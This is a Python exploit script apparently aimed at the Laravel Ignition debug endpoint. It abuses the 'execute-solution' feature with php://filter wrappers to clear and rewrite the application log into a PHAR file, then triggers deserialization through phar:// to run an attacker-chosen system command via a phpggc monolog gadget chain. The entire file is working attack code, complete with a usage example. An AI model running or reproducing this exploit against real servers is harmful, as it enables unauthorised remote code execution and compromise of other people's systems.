import base64
import re
import sys
from dataclasses import dataclass
import os
import requests


@dataclass
class Exploit:
    session: requests.Session
    url: str
    payload: bytes
    log_path: str

    def main(self):
        if not self.log_path:
            self.log_path = self.get_log_path()
        
        try:
            self.clear_logs()
            self.put_payload()
            self.convert_to_phar()
            self.run_phar()
        finally:
            self.clear_logs()

    def success(self, message, *args):
        print('+ ' + message.format(*args))

    def failure(self, message, *args):
        print('- ' + message.format(*args))
        exit()

    def get_log_path(self):
        r = self.run_wrapper('DOESNOTEXIST')
        match = re.search(r'"file":"(\\/[^"]+?)\\/vendor\\/[^"]+?"', r.text)
        if not match:
            self.failure('Unable to find full path')
        path = match.group(1).replace('\\/', '/')
        path = f'{path}/storage/logs/laravel.log'
        r = self.run_wrapper(path)
        if r.status_code != 200:
            self.failure('Log file does not exist: {}', path)

        self.success('Log file: {}', path)
        return path
    
    def clear_logs(self):
        wrapper = f'php://filter/read=consumed/resource={self.log_path}'
        self.run_wrapper(wrapper)
        self.success('Logs cleared')
        return True

    def get_write_filter(self):
        filters = '|'.join((
            'convert.quoted-printable-decode',
            'convert.iconv.utf-16le.utf-8',
            'convert.base64-decode'
        ))
        return f'php://filter/write={filters}/resource={self.log_path}'

    def run_wrapper(self, wrapper):
        solution = "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"
        return self.session.post(
            self.url + '/_ignition/execute-solution/',
            json={
                "solution": solution,
                "parameters": {
                    "viewFile": wrapper,
                    "variableName": "doesnotexist"
                }
            }
        )

    def put_payload(self):
        payload = self.generate_payload()
        # This garanties the total log size is even
        self.run_wrapper(payload)
        self.run_wrapper('AA')

    def generate_payload(self):
        payload = self.payload
        payload = base64.b64encode(payload).decode().rstrip('=')
        payload = ''.join(c + '=00' for c in payload)
        # The payload gets displayed twice: use an additional '=00' so that
        # the second one does not have the same word alignment
        return 'A' * 100 + payload + '=00'

    def convert_to_phar(self):
        wrapper = self.get_write_filter()
        r = self.run_wrapper(wrapper)
        if r.status_code == 200:
            self.success('Successfully converted to PHAR !')
        else:
            self.failure('Convertion to PHAR failed (try again ?)')

    def run_phar(self):
        wrapper = f'phar://{self.log_path}/test.txt'
        r = self.run_wrapper(wrapper)
        if r.status_code != 500:
            self.failure('Deserialisation failed ?!!')
        self.success('Phar deserialized')
        # We might be able to read the output of system, but if we can't, it's ok
        match = re.search('^(.*?)\n<!doctype html>\n<html class="', r.text, flags=re.S)

        if match:
            print('--------------------------')
            print(match.group(1))
            print('--------------------------')
        elif 'phar error: write operations' in r.text:
            print('Exploit succeeded')
        else:
            print('Done')


def main(url, command):
    os.system(f"php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system {command}")    
    payload = open('./exploit.phar', 'rb').read()
    session = requests.Session()
    exploit = Exploit(session, url.rstrip('/'), payload, None)
    exploit.main()


if len(sys.argv) <= 1:
    print(
        f'Usage: {sys.argv[0]} <url> <command_to_execute>\n'
        'Example:\n'
        '  $ ./laravel-ignition-rce.py http://127.0.0.1:8000/ id\n'
    )
    exit()

main(sys.argv[1], sys.argv[2])
